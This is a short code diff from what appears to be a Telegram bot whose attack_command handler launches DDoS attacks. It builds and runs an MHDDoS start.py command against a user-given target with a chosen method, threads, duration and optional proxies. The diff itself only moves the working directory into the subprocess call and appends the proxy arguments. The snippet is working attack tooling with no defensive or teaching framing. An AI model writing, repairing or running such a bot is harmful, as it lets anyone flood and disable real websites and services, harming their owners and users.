@@ -146,25 +146,23 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                                   f"Attack ID: {attack_id}")
     
     try:
-        # Change to the MHDDoS directory
-        os.chdir(MHDDOS_PATH)
-        
         # Prepare the command
         cmd = ["python3", "start.py", method, target, str(threads), "0", "0", str(duration)]
         
         # Add proxy if requested
         if use_proxy:
-            cmd.insert(3, proxy_type)
-            cmd.insert(4, PROXY_PATH)
+            cmd.append(proxy_type)
+            cmd.append(PROXY_PATH)
         
-        # Start the process
+        # Start the process in MHDDoS directory
         process = subprocess.Popen(
             cmd,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             text=True,
             bufsize=1,
-            universal_newlines=True
+            universal_newlines=True,
+            cwd=MHDDOS_PATH
         )
         
         # Store the process with parameters
